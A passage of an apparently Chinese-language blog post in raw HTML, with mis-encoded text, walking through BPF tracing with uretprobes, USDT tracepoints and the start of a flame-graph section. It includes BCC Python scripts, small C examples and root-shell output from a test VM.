class="line">b'       hello-bpf-1977821 [000] d..31 841383.099817: bpf_trace_printk: New hello-bpf process running with PID: 1977821'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977829 [000] d..31 841384.195796: bpf_trace_printk: New hello-bpf process running with PID: 1977829'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977833 [000] d..31 841384.907406: bpf_trace_printk: New hello-bpf process running with PID: 1977833'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977836 [000] d..31 841385.280290: bpf_trace_printk: New hello-bpf process running with PID: 1977836'</span><br></pre></td></tr></table></figure><h4 id="Uretprobes"><a href="#Uretprobes" class="headerlink" title="Uretprobes"></a>Uretprobes</h4><p><code>Uretprobes</code>æ˜¯<code>kretprobes</code>çš„å¹¶è¡Œæ¢é’ˆï¼Œä½†ç”¨äºç”¨æˆ·ç©ºé—´ç¨‹åºã€‚å®ƒä»¬å°†BPFç¨‹åºé™„ç€åˆ°è¿”å›å€¼çš„æŒ‡ä»¤ä¸Šï¼Œå¹¶è®©ä½ é€šè¿‡è®¿é—®BPFä»£ç ä¸­çš„å¯„å­˜å™¨æ¥è®¿é—®è¿™äº›è¿”å›å€¼ã€‚</p><p>ç»“åˆ<code>uprobes</code>å’Œ<code>uretprobes</code>å¯ä»¥è®©ä½ ç¼–å†™æ›´å¤æ‚çš„BPFç¨‹åºã€‚ å®ƒä»¬å¯ä»¥è®©ä½ æ›´å…¨é¢åœ°äº†è§£ç³»ç»Ÿä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚å½“ä½ å¯ä»¥åœ¨å‡½æ•°è¿è¡Œä¹‹å‰å’Œå®Œæˆåç«‹å³æ³¨å…¥è·Ÿè¸ªä»£ç æ—¶ï¼Œå¯ä»¥å¼€å§‹æ”¶é›†æ›´å¤šæ•°æ®å¹¶æµ‹é‡åº”ç”¨ç¨‹åºè¡Œä¸ºã€‚ä¸€ä¸ªå¸¸è§çš„ç”¨ä¾‹æ˜¯æµ‹é‡ä¸€ä¸ªå‡½æ•°æ‰§è¡Œéœ€è¦å¤šé•¿æ—¶é—´ï¼Œè€Œæ— éœ€æ›´æ”¹åº”ç”¨ç¨‹åºä¸­çš„ä¸€è¡Œä»£ç ã€‚</p><p><code>uretprobes.py</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">int trace_start_time(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int print_duration(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 *start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0) &#123;</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  u64 duration_ns = bpf_ktime_get_ns() - *start_time_ns;</span></span><br><span class="line"><span class="string">  bpf_trace_printk("Function call duration: %d\\n", duration_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_uprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"trace_start_time"</span>)</span><br><span class="line">bpf.attach_uretprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"print_duration"</span>)</span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ‰§è¡Œ<code>hello-bpf</code>ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br></pre></td></tr></table></figure><p>æ¥ç€æŸ¥çœ‹<code>uprobes.py</code>ç¨‹åºçš„è¾“å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 uprobes.py </span><br><span class="line">b'       hello-bpf-1980788 [000] d..31 842673.650139: bpf_trace_printk: Function call duration: 73230'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980801 [000] d..31 842677.296529: bpf_trace_printk: Function call duration: 307682'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980810 [000] d..31 842678.797365: bpf_trace_printk: Function call duration: 85177'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980814 [000] d..31 842680.214506: bpf_trace_printk: Function call duration: 330715'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980818 [000] d..31 842681.247549: bpf_trace_printk: Function call duration: 70589'</span><br></pre></td></tr></table></figure><h4 id="User-Statically-Defined-Tracepoints"><a href="#User-Statically-Defined-Tracepoints" class="headerlink" title="User Statically Defined Tracepoints"></a>User Statically Defined Tracepoints</h4><p>ç”¨æˆ·é™æ€å®šä¹‰çš„è·Ÿè¸ªç‚¹(USDT)ä¸ºç”¨æˆ·ç©ºé—´ä¸­çš„åº”ç”¨ç¨‹åºæä¾›é™æ€è·Ÿè¸ªç‚¹ã€‚è¿™æ˜¯ä¸€ç§æ£€æµ‹åº”ç”¨ç¨‹åºçš„ä¾¿æ·æ–¹å¼ï¼Œå› ä¸ºå®ƒä»¬æä¾›äº†BPFæä¾›çš„è·Ÿè¸ªåŠŸèƒ½çš„ä½å¼€é”€å…¥å£ç‚¹ã€‚ä½ è¿˜å¯ä»¥å°†å®ƒä»¬ç”¨ä½œåœ¨ç”Ÿäº§ä¸­è·Ÿè¸ªåº”ç”¨ç¨‹åºçš„çº¦å®šï¼Œè€Œä¸ç®¡è¿™äº›åº”ç”¨ç¨‹åºæ˜¯ä½¿ç”¨ä½•ç§ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ã€‚</p><p>USDTç”±DTraceæ¨å¹¿ï¼ŒDTraceæœ€åˆç”±Sun Microsystemså¼€å‘ï¼Œç”¨äºUnixç³»ç»Ÿçš„åŠ¨æ€æ£€æµ‹ã€‚ ç”±äºè®¸å¯é—®é¢˜ï¼ŒDTraceç›´åˆ°æœ€è¿‘æ‰åœ¨Linuxä¸­å¯ç”¨ï¼›ä½†æ˜¯ï¼ŒLinuxå†…æ ¸å¼€å‘äººå‘˜ä»DTraceçš„åŸå§‹å·¥ä½œä¸­è·å¾—äº†å¾ˆå¤šçµæ„Ÿæ¥å®ç°USDTã€‚</p><p>å°±åƒä¹‹å‰çœ‹åˆ°çš„é™æ€å†…æ ¸è·Ÿè¸ªç‚¹ä¸€æ ·ï¼ŒUSDTè¦æ±‚å¼€å‘äººå‘˜ä½¿ç”¨æŒ‡ä»¤æ¥æ£€æµ‹ä»–ä»¬çš„ä»£ç ï¼Œå†…æ ¸å°†ä½¿ç”¨è¿™äº›æŒ‡ä»¤ä½œä¸ºé™·é˜±æ¥æ‰§è¡ŒBPFç¨‹åºã€‚ USDTçš„<code>Hello World</code>ç‰ˆæœ¬åªæœ‰å‡ è¡Œä»£ç ï¼š</p><p><code>hello_usdt.c</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sdt.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DTRACE_PROBE(<span class="string">"hello-usdt"</span>, <span class="string">"probe-main"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨Linuxæä¾›çš„å®æ¥å®šä¹‰æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªUSDTã€‚<code>DTRACE_PROBE</code>å°†æ³¨å†Œå†…æ ¸å°†ç”¨äºæ³¨å…¥BPFå‡½æ•°å›è°ƒçš„è·Ÿè¸ªç‚¹ã€‚è¯¥å®ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŠ¥å‘Šè·Ÿè¸ªçš„ç¨‹åºã€‚ç¬¬äºŒä¸ªæ˜¯æˆ‘ä»¬æŠ¥å‘Šè·Ÿè¸ªçš„åç§°ã€‚</p><p>å®‰è£…åœ¨ç³»ç»Ÿä¸­çš„è®¸å¤šåº”ç”¨ç¨‹åºéƒ½å¯èƒ½ä½¿ç”¨è¿™ç§ç±»å‹çš„æ¢é’ˆï¼Œä»¥ä¾¿ä»¥ä¸€ç§å¯é¢„æµ‹çš„æ–¹å¼è®¿é—®è¿è¡Œæ—¶è·Ÿè¸ªæ•°æ®ã€‚ä¾‹å¦‚ï¼Œæ•°æ®åº“MySQLä½¿ç”¨é™æ€å®šä¹‰çš„è·Ÿè¸ªç‚¹å…¬å¼€å„ç§ä¿¡æ¯ã€‚ä½ å¯ä»¥ä»æœåŠ¡å™¨ä¸­æ‰§è¡Œçš„æŸ¥è¯¢ä»¥åŠè®¸å¤šå…¶ä»–ç”¨æˆ·æ“ä½œä¸­æ”¶é›†ä¿¡æ¯ã€‚<code>Node.js</code>æ˜¯æ„å»ºåœ¨<code>Chrome V8</code>å¼•æ“ä¸Šçš„JavaScriptè¿è¡Œæ—¶ï¼ŒåŒæ ·æä¾›äº†å¯ç”¨äºæå–è¿è¡Œæ—¶ä¿¡æ¯çš„è·Ÿè¸ªç‚¹ã€‚</p><p>åœ¨å±•ç¤ºå¦‚ä½•å°†BPFç¨‹åºé™„ç€åˆ°ç”¨æˆ·å®šä¹‰çš„è·Ÿè¸ªç‚¹ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè°ˆè°ˆå¯å‘ç°æ€§ã€‚å› ä¸ºè¿™äº›è·Ÿè¸ªç‚¹æ˜¯åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä»¥äºŒè¿›åˆ¶æ ¼å¼å®šä¹‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ç§æ–¹æ³•æ¥åˆ—å‡ºç¨‹åºå®šä¹‰çš„æ¢é’ˆï¼Œè€Œæ— éœ€æ·±å…¥ç ”ç©¶æºä»£ç ã€‚æå–æ­¤ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥è¯»å–ELFäºŒè¿›åˆ¶æ–‡ä»¶ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å°†ç¼–è¯‘æˆ‘ä»¬ä¹‹å‰çš„Hello World USDTç¤ºä¾‹ï¼› æˆ‘ä»¬å¯ä»¥ä¸ºæ­¤ä½¿ç”¨ GCCï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello_usdt hello_usdt.c</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æŠ¥é”™å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hello_usdt.c:1:10: fatal error: sys/sdt.h: No such file or directory</span><br><span class="line"><span class="meta"> #</span><span class="bash">include &lt;sys/sdt.h&gt;</span></span><br><span class="line">          ^~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure><p>æŠ¥é”™è§£å†³å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# yum install systemtap-sdt-devel</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°<code>gcc</code>å‘½ä»¤å°†ç”Ÿæˆä¸€ä¸ªåä¸º<code>hello_usdt</code>çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥æ–‡ä»¶å¼€å§‹ä½¿ç”¨å¤šä¸ªå·¥å…·æ¥å‘ç°å®ƒå®šä¹‰çš„è·Ÿè¸ªç‚¹ã€‚ Linuxæä¾›äº†ä¸€ä¸ªåä¸º<code>readelf</code>çš„å®ç”¨ç¨‹åºæ¥æ˜¾ç¤ºæœ‰å…³ELFæ–‡ä»¶çš„ä¿¡æ¯ã€‚ ä½ å¯ä»¥å°†å®ƒä¸æˆ‘ä»¬ç¼–è¯‘çš„ç¤ºä¾‹ä¸€èµ·ä½¿ç”¨ï¼Œ<code>readelf</code>å¯ä»¥æä¾›æœ‰å…³äºŒè¿›åˆ¶æ–‡ä»¶çš„å¤§é‡ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# readelf -n ./hello_usdt</span><br><span class="line">Displaying notes found in: .note.stapsdt</span><br><span class="line">  Owner                 Data sizeDescription</span><br><span class="line">  stapsdt              0x00000033NT_STAPSDT (SystemTap probe descriptors)</span><br><span class="line">    Provider: "hello-usdt"</span><br><span class="line">    Name: "probe-main"</span><br></pre></td></tr></table></figure><p>å‘ç°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å®šä¹‰çš„è·Ÿè¸ªç‚¹çš„æ›´å¥½é€‰æ‹©æ˜¯ä½¿ç”¨BCCçš„<code>tplist</code>å·¥å…·ï¼Œè¯¥å·¥å…·å¯ä»¥æ˜¾ç¤ºå†…æ ¸è·Ÿè¸ªç‚¹å’ŒUSDTã€‚è¿™ä¸ªå·¥å…·çš„ä¼˜ç‚¹æ˜¯å®ƒçš„è¾“å‡ºç®€å•ï¼›ä»…æ˜¾ç¤ºè·Ÿè¸ªç‚¹å®šä¹‰ï¼Œè€Œæ²¡æœ‰å…³äºå¯æ‰§è¡Œæ–‡ä»¶çš„ä»»ä½•å…¶ä»–ä¿¡æ¯ã€‚ç”¨æ³•ç±»ä¼¼äº<code>readelf</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# /usr/share/bcc/tools/tplist -l ./hello_usdt</span><br><span class="line">b'./hello_usdt' b'"hello-usdt"':b'"probe-main"'</span><br></pre></td></tr></table></figure><p>å®ƒåˆ—å‡ºäº†ä½ åœ¨å•ç‹¬çš„è¡Œä¸­å®šä¹‰çš„æ¯ä¸ªè·Ÿè¸ªç‚¹ã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œå®ƒä»…æ˜¾ç¤ºä¸€è¡Œå¸¦æœ‰æˆ‘ä»¬çš„<code>probe-main</code>å®šä¹‰ï¼š</p><p>åœ¨ä½ çŸ¥é“äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ”¯æŒçš„è·Ÿè¸ªç‚¹ä¹‹åï¼Œä½ å¯ä»¥å°†BPFç¨‹åºé™„ç€åˆ°å®ƒä»¬ä¸Šï¼Œå°±åƒä½ åœ¨å‰é¢çš„ä¾‹å­ä¸­çœ‹åˆ°çš„é‚£æ ·ï¼š</p><p><code>usdt.py</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, USDT</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int trace_binary_exec(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  bpf_trace_printk("New hello_usdt process running with PID: %d\\n", pid);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">usdt = USDT(path = <span class="string">"./hello_usdt"</span>)<span class="number">1</span></span><br><span class="line">usdt.enable_probe(probe = <span class="string">"probe-main"</span>, fn_name = <span class="string">"trace_binary_exec"</span>)<span class="number">2</span></span><br><span class="line">bpf = BPF(text = bpf_source, usdt_contexts = [usdt])<span class="number">3</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1ï¼šåˆ›å»ºä¸€ä¸ªUSDTå¯¹è±¡ï¼› USDTä¸æ˜¯BPFçš„ä¸€éƒ¨åˆ†ï¼Œå› ä¸ºä½ å¯ä»¥åœ¨æ— éœ€ä¸BPFè™šæ‹Ÿæœºäº¤äº’çš„æƒ…å†µä¸‹ä½¿ç”¨å®ƒä»¬ã€‚å› ä¸ºå®ƒä»¬å½¼æ­¤ç‹¬ç«‹ï¼Œæ‰€ä»¥å®ƒä»¬çš„ä½¿ç”¨ç‹¬ç«‹äºBPFä»£ç ã€‚</p><p>2ï¼šé™„ç€BPFå‡½æ•°ä»¥è·Ÿè¸ªç¨‹åºæ‰§è¡Œåˆ°æˆ‘ä»¬åº”ç”¨ç¨‹åºä¸­çš„æ¢é’ˆ</p><p>3ï¼šä½¿ç”¨åˆšåˆšåˆ›å»ºçš„è·Ÿè¸ªç‚¹å®šä¹‰åˆå§‹åŒ–BPFç¯å¢ƒã€‚ è¿™å°†é€šçŸ¥BCCéœ€è¦ç”Ÿæˆä»£ç æ¥è¿æ¥æˆ‘ä»¬çš„BPFç¨‹åºå’ŒäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ¢é’ˆå®šä¹‰ã€‚å½“å®ƒä»¬éƒ½è¿æ¥æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å°BPFç¨‹åºç”Ÿæˆçš„è·Ÿè¸ªï¼Œä»¥å‘ç°äºŒè¿›åˆ¶ç¤ºä¾‹ä¸­æœ€æ–°çš„æ‰§è¡Œã€‚</p><h3 id="å¯è§†åŒ–è·Ÿè¸ªæ•°æ®"><a href="#å¯è§†åŒ–è·Ÿè¸ªæ•°æ®" class="headerlink" title="å¯è§†åŒ–è·Ÿè¸ªæ•°æ®"></a>å¯è§†åŒ–è·Ÿè¸ªæ•°æ®</h3><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»å±•ç¤ºäº†åœ¨è°ƒè¯•è¾“å‡ºä¸­æ‰“å°æ•°æ®çš„ç¤ºä¾‹ã€‚è¿™åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¸æ˜¯å¾ˆæœ‰ç”¨ã€‚ æ²¡æœ‰äººå–œæ¬¢ç†è§£å†—é•¿è€Œå¤æ‚çš„æ—¥å¿—ã€‚å¦‚æœæˆ‘ä»¬æƒ³ç›‘æ§å»¶è¿Ÿå’ŒCPUåˆ©ç”¨ç‡çš„å˜åŒ–ï¼Œé€šè¿‡æŸ¥çœ‹ä¸€æ®µæ—¶é—´å†…çš„å›¾è¡¨æ¯”æ±‡æ€»æ–‡ä»¶æµä¸­çš„æ•°å­—æ›´å®¹æ˜“ã€‚</p><p>æœ¬èŠ‚æ¢è®¨å‘ˆç°BPFè·Ÿè¸ªæ•°æ®çš„ä¸åŒæ–¹å¼ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å°†å±•ç¤ºBPFç¨‹åºå¦‚ä½•æ„å»ºèšåˆä¿¡æ¯ã€‚å¦ä¸€æ–¹é¢ï¼Œä½ å°†å­¦ä¹ å¦‚ä½•ä»¥ä¾¿æºå¼è¡¨ç¤ºå½¢å¼å¯¼å‡ºè¯¥ä¿¡æ¯ï¼Œå¹¶ä½¿ç”¨ç°æˆçš„å·¥å…·è®¿é—®æ›´ä¸°å¯Œçš„è¡¨ç¤ºå½¢å¼å¹¶ä¸å…¶ä»–äººåˆ†äº«ã€‚</p><h4 id="ç«ç„°å›¾"><a href="#ç«ç„°å›¾" class="headerlink" title="ç«ç„°å›¾"></a>ç«ç„°å›¾</h4><p>ç«ç„°å›¾æ˜¯å¸®åŠ©ä½ å¯è§†åŒ–ç³»ç»ŸèŠ±è´¹æ—¶é—´çš„å›¾è¡¨ã€‚å®ƒä»¬å¯ä»¥è®©ä½ æ¸…æ¥šåœ°è¡¨ç¤ºåº”ç”¨ç¨‹åºä¸­çš„å“ªäº›ä»£ç æ‰§è¡Œå¾—æ›´é¢‘ç¹ã€‚ç«ç„°å›¾çš„åˆ›å»ºè€…<code>Brendan Gregg</code>ç»´æŠ¤äº†ä¸€ç»„è„šæœ¬ï¼Œå¯ä»¥åœ¨GitHubä¸Šè½»æ¾ç”Ÿæˆè¿™äº›å¯è§†åŒ–æ ¼å¼ã€‚æˆ‘ä»¬ä½¿ç”¨è¿™äº›è„šæœ¬ä»æœ¬èŠ‚åé¢ä½¿ç”¨BPFæ”¶é›†çš„æ•°æ®ç”Ÿæˆç«ç„°å›¾ã€‚ </p><p>å…³äºç«ç„°å›¾æ˜¾ç¤ºçš„å†…å®¹ï¼Œéœ€è¦è®°ä½ä¸¤ä»¶é‡è¦çš„äº‹æƒ…ï¼š</p><ul><li>xè½´æŒ‰å­—æ¯é¡ºåºæ’åˆ—ã€‚æ¯ä¸ªå †æ ˆçš„å®½åº¦è¡¨ç¤ºå®ƒåœ¨æ”¶é›†æ•°æ®ä¸­å‡ºç°çš„é¢‘ç‡ï¼Œè¿™å¯ä»¥ä¸å¯ç”¨æ¢æŸ¥å™¨æ—¶è®¿é—®è¯¥ä»£ç è·¯å¾„çš„é¢‘ç‡ç›¸å…³ã€‚</li><li>y è½´æ˜¾ç¤ºåœ¨åˆ†æå™¨è¯»å–å †æ ˆè·Ÿè¸ªæ—¶æ’åºï¼Œä¿ç•™è·Ÿè¸ªå±‚æ¬¡ç»“æ„ã€‚</li></ul><p>æœ€è‘—åçš„ç«ç„°å›¾ä»£è¡¨äº†ç³»ç»Ÿä¸­æœ€é¢‘ç¹æ¶ˆè€—CPUçš„ä»£ç ï¼›è¿™äº›è¢«ç§°ä¸ºCPUå›¾ã€‚å¦ä¸€ä¸ªæœ‰è¶£çš„ç«ç„°å›¾å¯è§†åŒ–æ˜¯CPUå¤–å›¾ï¼›å®ƒä»¬ä»£è¡¨CPUåœ¨ä¸åº”ç”¨ç¨‹åºæ— å…³çš„å…¶ä»–ä»»åŠ¡ä¸ŠèŠ±è´¹çš„æ—¶é—´ã€‚é€šè¿‡ç»„åˆ<code>on-CPU</code>å’Œ<code>off-CPU</code>å›¾è¡¨ï¼Œå¯ä»¥å…¨é¢äº†è§£ç³»ç»ŸèŠ±è´¹CPUå‘¨æœŸçš„å†…å®¹ã€‚</p><p>CPUå†…å’ŒCPUå¤–å›¾éƒ½ä½¿ç”¨å †æ ˆè·Ÿè¸ªæ¥æŒ‡ç¤ºç³»ç»ŸèŠ±è´¹æ—¶é—´çš„ä½ç½®ã€‚ ä¸€äº›ç¼–ç¨‹è¯­è¨€ï¼Œå¦‚Goï¼Œæ€»æ˜¯åœ¨å…¶äºŒè¿›åˆ¶æ–‡ä»¶ä¸­åŒ…å«è·Ÿè¸ªä¿¡æ¯ï¼Œä½†å…¶ä»–ç¼–ç¨‹è¯­è¨€ï¼Œå¦‚ C++ å’ŒJavaï¼Œéœ€è¦ä¸€äº›é¢å¤–çš„å·¥ä½œæ‰èƒ½ä½¿å †æ ˆè·Ÿè¸ªå¯è¯»ã€‚åœ¨ä½ çš„åº”ç”¨ç¨‹åºåŒ…å«å †æ ˆè·Ÿè¸ªä¿¡æ¯åï¼ŒBPFç¨‹åºå¯ä»¥ä½¿ç”¨å®ƒæ¥èšåˆå†…æ ¸çœ‹åˆ°çš„æœ€å¸¸è§çš„ä»£ç è·¯å¾„ã€‚</p><p>å†…æ ¸ä¸­çš„å †æ ˆè·Ÿè¸ªèšåˆæœ‰ä¼˜ç‚¹ä¹Ÿæœ‰ç¼ºç‚¹ã€‚ä¸€æ–¹é¢ï¼Œè¿™æ˜¯ä¸€ç§è®¡ç®—å †æ ˆè·Ÿè¸ªé¢‘ç‡çš„æœ‰æ•ˆæ–¹æ³•ï¼Œå› ä¸ºå®ƒå‘ç”Ÿåœ¨å†…æ ¸ä¸­ï¼Œé¿å…å°†æ¯ä¸ªå †æ ˆä¿¡æ¯å‘é€åˆ°ç”¨æˆ·ç©ºé—´å¹¶å‡å°‘å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´çš„æ•°æ®äº¤æ¢ã€‚å¦ä¸€æ–¹é¢ï¼ŒéCPUå›¾è¡¨è¦å¤„ç†çš„äº‹ä»¶æ•°é‡å¯èƒ½ä¼šéå¸¸é«˜ï¼Œå› ä¸ºä½ æ­£åœ¨è·Ÿè¸ªåº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡åˆ‡æ¢æœŸé—´å‘ç”Ÿçš„æ¯ä¸ªäº‹ä»¶ã€‚å¦‚æœå°è¯•å¯¹å…¶è¿›è¡Œåˆ†æå¤ªé•¿æ—¶é—´ï¼Œè¿™å¯èƒ½ä¼šåœ¨ç³»ç»Ÿä¸­äº§ç”Ÿå¤§é‡å¼€é”€ã€‚ ä½¿ç”¨ç«ç„°å›¾æ—¶è¯·è®°ä½è¿™ä¸€ç‚¹ã€‚</p><p>BCCæä¾›äº†å‡ ä¸ªå®ç”¨ç¨‹åºæ¥å¸®åŠ©èšåˆå’Œå¯è§†åŒ–å †æ ˆè·Ÿè¸ªï¼Œä¸»è¦çš„æ˜¯å®<code>BPF_STACK_TRACE</code>ã€‚ è¿™ä¸ªå®ç”Ÿæˆä¸€ä¸ª<code>BPF_MAP_TYPE_STACK_TRACE</code>ç±»å‹çš„BPFæ˜ å°„æ¥å­˜å‚¨BPFç¨‹åºç´¯ç§¯çš„å †æ ˆã€‚æœ€é‡è¦çš„æ˜¯ï¼Œè¿™ä¸ªBPFæ˜ å°„å¾—åˆ°äº†å¢å¼ºï¼Œå¢åŠ äº†ä»ç¨‹åºä¸Šä¸‹æ–‡ä¸­æå–å †æ ˆä¿¡æ¯çš„æ–¹æ³•ï¼Œå¹¶åœ¨èšåˆå®ƒä»¬ååœ¨ä½ æƒ³ä½¿ç”¨å®ƒä»¬æ—¶éå†ç´¯ç§¯çš„å †æ ˆè·Ÿè¸ªã€‚</p><p>åœ¨ä¸‹ä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªç®€å•çš„BPFåˆ†æå™¨ï¼Œå®ƒæ‰“å°ä»ç”¨æˆ·ç©ºé—´åº”ç”¨ç¨‹åºæ”¶é›†çš„å †æ 